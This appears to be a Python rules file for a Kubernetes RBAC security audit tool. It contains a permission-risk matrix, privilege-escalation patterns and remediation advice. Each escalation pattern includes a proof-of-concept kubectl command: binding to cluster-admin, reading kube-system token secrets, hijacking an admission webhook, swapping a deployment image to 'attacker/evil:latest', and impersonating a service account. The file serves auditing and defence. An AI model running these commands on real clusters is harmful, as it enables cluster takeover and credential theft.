"""RBAC 审计规则：检测矩阵 + 提权链模式。"""

# level: critical | high | medium | low
# scope: cluster（集群级）| current_ns | kube-system
PERMISSION_CHECKS = [
    # ── Critical ──
    {"level": "critical", "verb": "create", "resource": "clusterrolebindings",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "patch", "resource": "clusterrolebindings",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "create", "resource": "clusterroles",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "patch", "resource": "clusterroles",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "bind", "resource": "clusterroles",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "escalate", "resource": "clusterroles",
     "group": "rbac.authorization.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "create", "resource": "validatingwebhookconfigurations",
     "group": "admissionregistration.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "create", "resource": "mutatingwebhookconfigurations",
     "group": "admissionregistration.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "patch", "resource": "validatingwebhookconfigurations",
     "group": "admissionregistration.k8s.io", "scope": "cluster"},
    {"level": "critical", "verb": "patch", "resource": "mutatingwebhookconfigurations",
     "group": "admissionregistration.k8s.io", "scope": "cluster"},
    # ── High ──
    {"level": "high", "verb": "create", "resource": "pods", "group": "", "scope": "current_ns"},
    {"level": "high", "verb": "create", "resource": "pods", "group": "", "scope": "kube-system"},
    {"level": "high", "verb": "exec", "resource": "pods", "group": "", "scope": "current_ns"},
    {"level": "high", "verb": "exec", "resource": "pods", "group": "", "scope": "kube-system"},
    {"level": "high", "verb": "patch", "resource": "deployments", "group": "apps", "scope": "current_ns"},
    {"level": "high", "verb": "patch", "resource": "deployments", "group": "apps", "scope": "kube-system"},
    {"level": "high", "verb": "create", "resource": "daemonsets", "group": "apps", "scope": "current_ns"},
    {"level": "high", "verb": "create", "resource": "cronjobs", "group": "batch", "scope": "current_ns"},
    {"level": "high", "verb": "create", "resource": "statefulsets", "group": "apps", "scope": "current_ns"},
    {"level": "high", "verb": "patch", "resource": "serviceaccounts", "group": "", "scope": "current_ns"},
    {"level": "high", "verb": "impersonate", "resource": "serviceaccounts", "group": "", "scope": "cluster"},
    # ── Medium ──
    {"level": "medium", "verb": "get", "resource": "secrets", "group": "", "scope": "current_ns"},
    {"level": "medium", "verb": "list", "resource": "secrets", "group": "", "scope": "current_ns"},
    {"level": "medium", "verb": "get", "resource": "secrets", "group": "", "scope": "kube-system"},
    {"level": "medium", "verb": "list", "resource": "secrets", "group": "", "scope": "cluster"},
    {"level": "medium", "verb": "get", "resource": "configmaps", "group": "", "scope": "current_ns"},
    {"level": "medium", "verb": "list", "resource": "serviceaccounts", "group": "", "scope": "cluster"},
    {"level": "medium", "verb": "get", "resource": "nodes", "group": "", "scope": "cluster"},
    # ── Low ──
    {"level": "low", "verb": "get", "resource": "pods", "group": "", "scope": "current_ns"},
    {"level": "low", "verb": "list", "resource": "pods", "group": "", "scope": "cluster"},
    {"level": "low", "verb": "list", "resource": "services", "group": "", "scope": "current_ns"},
    {"level": "low", "verb": "list", "resource": "namespaces", "group": "", "scope": "cluster"},
]

LEVEL_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}
LEVEL_LABEL = {
    "critical": "严重",
    "high": "高",
    "medium": "中",
    "low": "低",
}

ESCALATION_PATTERNS = [
    {
        "id": "direct_binding",
        "name": "直接绑定 cluster-admin",
        "risk": "critical",
        "requires_any": [
            ["create clusterrolebindings"],
            ["patch clusterrolebindings"],
        ],
        "steps": [
            "创建 ClusterRoleBinding，将当前 SA 绑定到 cluster-admin",
        ],
        "poc": (
            "kubectl create clusterrolebinding escalate-admin \\\n"
            "  --clusterrole=cluster-admin \\\n"
            "  --serviceaccount=<namespace>:<sa-name>"
        ),
    },
    {
        "id": "pod_secret_theft",
        "name": "Pod + Secret 窃取",
        "risk": "critical",
        "requires_any": [
            ["create pods", "get secrets"],
            ["create pods", "list secrets"],
        ],
        "steps": [
            "列举 kube-system 中的 secrets",
            "创建 Pod 并 volumeMount 挂载 admin token secret",
            "Exec 进入 Pod 读取 /var/run/secrets/.../token",
        ],
        "poc": (
            "# 1. kubectl get secrets -n kube-system\n"
            "# 2. 创建 Pod 挂载目标 secret\n"
            "# 3. kubectl exec <pod> -n kube-system cat /mnt/secret/token"
        ),
    },
    {
        "id": "webhook_hijacking",
        "name": "Webhook 劫持",
        "risk": "critical",
        "requires_any": [
            ["create mutatingwebhookconfigurations"],
            ["create validatingwebhookconfigurations"],
            ["patch mutatingwebhookconfigurations"],
        ],
        "steps": [
            "在可控服务器部署恶意 webhook",
            "创建 Mutating/ValidatingWebhookConfiguration",
            "拦截 Pod 创建并注入恶意配置",
        ],
        "poc": (
            "kubectl create -f mutating-webhook-config.yaml\n"
            "# webhook 指向攻击者控制的 HTTPS 端点"
        ),
    },
    {
        "id": "deployment_image_hijack",
        "name": "Deployment 镜像劫持",
        "risk": "high",
        "requires_any": [
            ["patch deployments"],
        ],
        "steps": [
            "Patch 高价值 Deployment 的镜像或 initContainer",
            "触发 Pod 重建获得 RCE",
        ],
        "poc": (
            "kubectl patch deployment <name> -n <ns> -p "
            "'{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"app\","
            "\"image\":\"attacker/evil:latest\"}]}}}}'"
        ),
    },
    {
        "id": "sa_impersonation",
        "name": "SA 枚举 + Pod 假冒",
        "risk": "critical",
        "requires_any": [
            ["create pods", "list serviceaccounts"],
        ],
        "steps": [
            "列举各 namespace 高权限 ServiceAccount",
            "创建 Pod 指定 serviceAccountName 为目标 SA",
            "Pod 自动挂载目标 SA 的 token",
        ],
        "poc": (
            "kubectl run impersonator --image=alpine --restart=Never \\\n"
            "  --serviceaccount=<high-priv-sa> -n <namespace>"
        ),
    },
]

RECOMMENDATIONS = {
    "critical": [
        "立即审计并移除 cluster-admin 相关 ClusterRoleBinding 的 create/patch 权限",
        "限制 admission webhook 配置的创建与修改权限",
    ],
    "high": [
        "限制 Pod 创建/exec 权限，启用 Pod Security Admission / 网络策略",
        "禁止非特权 namespace 向 kube-system 创建 Pod",
    ],
    "medium": [
        "按最小权限原则限制 secrets / serviceaccounts 的 list/get",
        "对 kube-system secrets 启用额外 RBAC 隔离",
    ],
}
